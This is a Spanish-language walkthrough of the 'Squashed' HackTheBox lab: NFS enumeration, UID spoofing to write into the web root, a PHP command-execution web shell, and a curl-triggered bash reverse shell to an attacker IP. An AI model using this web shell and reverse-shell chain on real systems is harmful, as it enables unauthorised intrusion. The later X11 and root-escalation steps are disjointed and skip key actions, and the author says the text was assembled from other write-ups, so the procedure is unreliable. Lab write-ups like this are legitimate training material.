# Máquina "Squashed" de HackTheBox

## Características

- Linux
- Easy
- NFS Enumeration
- Abusing owners assigned to NFS shares by creating new users on the system (Get access to Web Root)
- Creating a web shell to gain system access
- Abusing the Xauthority file (Pentest X11)
- Taking a Screenshot of another user's display

## Útil en

- OSCP

**IP:** 10.10.11.191

## Escaneo de puertos

```bash
nmap -p- --min-rate 10000 10.10.11.191
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
41527/tcp open  unknown
43109/tcp open  unknown
57809/tcp open  unknown
58777/tcp open  unknown
```

```bash
nmap -p 22,80,111,2049,41527,43109,57809,58777 -sCV 10.10.11.191
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38017/udp   mountd
|   100005  1,2,3      38441/udp6  mountd
|   100005  1,2,3      39221/tcp6  mountd
|   100005  1,2,3      57809/tcp   mountd
|   100021  1,3,4      34926/udp   nlockmgr
|   100021  1,3,4      35429/tcp6  nlockmgr
|   100021  1,3,4      41527/tcp   nlockmgr
|   100021  1,3,4      50850/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
41527/tcp open  nlockmgr 1-4 (RPC #100021)
43109/tcp open  mountd   1-3 (RPC #100005)
57809/tcp open  mountd   1-3 (RPC #100005)
58777/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis de puertos

- **22 SSH:** Si podemos adquirir credenciales, podremos iniciar sesión de forma remota
- **80 HTTP:** Se está alojando un servidor web con el título "Built Better"
- **111 RPC:** Llamada a procedimiento remoto que se puede utilizar para administrar remotamente el servidor
- **2049 NFS:** Un archivo compartido NFS

## Reconocimiento Web

Si visitamos la web vemos:

![Web Principal](/secciones/posts/imagenes/squashed/web1.webp)

## Enumeración NFS

Probamos conectarnos a RPC sin credenciales sin éxito. Podemos usar `showmount` para enumerar los archivos compartidos por NFS:

```bash
showmount -e 10.10.11.191
```

Vemos que `/home/ross` y `/var/www/html` están disponibles. Intentemos conectarnos al archivo compartido `/home/ross`:

![Ross Mount 1](/secciones/posts/imagenes/squashed/ross.webp)
![Ross Mount 2](/secciones/posts/imagenes/squashed/ross2.webp)

Vemos varios archivos, los listamos y procedemos a crear unos nuevos:

```bash
mkdir /tmp/www
mkdir /tmp/home_test
```

Montamos los archivos compartidos:

![Ross Mount 3](/secciones/posts/imagenes/squashed/ross3.webp)

Vemos los archivos:

```bash
tree -fas ./home_test
```

## Creación de usuarios para NFS

Creamos un nuevo usuario y le asignamos permisos:

```bash
sudo useradd new
sudo usermod -u 2017 new
sudo groupmod -g 2017 new
```

Cambiamos el usuario a root y luego cambiamos el usuario a new:

```bash
sudo su
su new
```

Lanzamos bash y creamos un shell en el directorio `/tmp`:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/www/shell.php
```

## Obtención de shell inverso

Ahora obtenemos el shell inverso:

```bash
curl "http://10.10.11.191/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.134/443%200%3E%261%22"
```

Y tenemos shell como alex, así que buscamos la flag de usuario.

## Enumeración adicional

Ejecutamos el comando `tree` en `home_test`, y en la salida vemos `documents/passwords.kdbx`. Lo enviamos a nuestra carpeta.

Ahora crearemos otro usuario:

```bash
sudo useradd user
sudo usermod -u 1001 user
```

Iniciamos sesión en este usuario desde nuestro root, para proceder enumerando el archivo:

```bash
ls -l ./.Xauthority
```

## Explotación de X11

Ejecutamos un servidor Python:

```bash
python3 -m http.server 8080 .
```

Y desde alex hacemos:

```bash
wget http://10.10.14.134:8080/.Xauthority
```

Ahora desde alex:

```bash
export HOME=/home/alex
```

## Escalada de privilegios

Ahora desde alex ingresamos con nuestra clave:

```bash
su root
```

Y somos root.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.